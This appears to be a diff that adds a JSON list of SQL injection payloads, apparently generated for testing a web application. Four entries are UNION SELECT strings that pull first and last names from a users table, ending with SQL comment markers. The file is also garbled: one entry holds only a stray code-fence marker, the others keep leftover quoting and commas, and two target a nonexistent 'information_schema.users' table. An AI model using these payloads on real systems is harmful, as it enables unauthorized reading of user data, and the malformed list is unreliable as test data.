@@ -1,1 +1,22 @@
-[]
+[
+    {
+        "id": "bd874c51-36be-47ed-8407-82f90f69ef8f",
+        "payload": "```json"
+    },
+    {
+        "id": "70d09956-e881-4ba2-87ef-99d7ad23581b",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM users -- \","
+    },
+    {
+        "id": "464f0387-c1ee-4a6d-aaa1-11188f921f88",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM users #\","
+    },
+    {
+        "id": "b8aadacd-4ea4-4b10-8a17-7904baac1af4",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM information_schema.users -- \","
+    },
+    {
+        "id": "b9bb005e-80e7-48ca-9b53-1e05dfbb2dc8",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM information_schema.users #\","
+    }
+]
